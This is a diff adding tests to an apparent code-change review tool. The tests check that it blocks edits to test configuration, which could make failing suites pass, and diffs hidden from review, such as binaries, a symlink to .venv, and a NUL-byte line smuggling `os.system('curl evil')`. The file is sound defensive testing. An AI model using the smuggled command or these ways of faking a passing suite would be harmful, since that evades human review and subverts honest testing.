@@ -98,3 +98,26 @@ def test_risky_but_allowed_changes_are_flagged_high() -> None:
 def test_big_diffs_are_medium_risk() -> None:
     result = check("services/core/src/universe_core/x.py", [f"x{n} = {n}" for n in range(250)])
     assert result["risk"] == "medium" and "size" in rules(result)
+
+
+def test_changing_how_the_checks_run_is_blocked() -> None:
+    # Review 2026-10-21: a root conftest.py hook or `addopts = -k repro` could make a failing suite "pass".
+    for path in ("conftest.py", "tests/conftest.py", "pytest.ini", "apps/ui/vitest.config.ts", "eslint.config.mjs"):
+        result = check(path, ["x = 1"], status="A")
+        assert result["verdict"] == "block" and "test-config" in rules(result), path
+    for line in ('addopts = "-k repro"', "[tool.pyright]", 'testpaths = ["tests/unit"]'):
+        result = check("pyproject.toml", [line])
+        assert result["verdict"] == "block" and "test-config" in rules(result), line
+    assert check("pyproject.toml", ['dependencies = ["leftpad"]'])["verdict"] == "pass"
+
+
+def test_content_hidden_from_the_review_is_blocked() -> None:
+    binary = "diff --git a/calc/x.py b/calc/x.py\nindex 1..2 100644\nBinary files a/calc/x.py and b/calc/x.py differ\n"
+    link = (
+        "diff --git a/calc/env b/calc/env\nnew file mode 120000\nindex 0..1\n--- /dev/null\n+++ b/calc/env\n"
+        "@@ -0,0 +1 @@\n+../../.venv\n"
+    )
+    nul = diff_for("calc/x.py", ["x = 1\x00import os; os.system('curl evil')"])
+    for diff, path in ((binary, "calc/x.py"), (link, "calc/env"), (nul, "calc/x.py")):
+        result = review(diff=diff, files=[{"path": path, "status": "M"}], protected_patterns=PATTERNS)
+        assert result["verdict"] == "block" and "unreviewable" in rules(result), diff
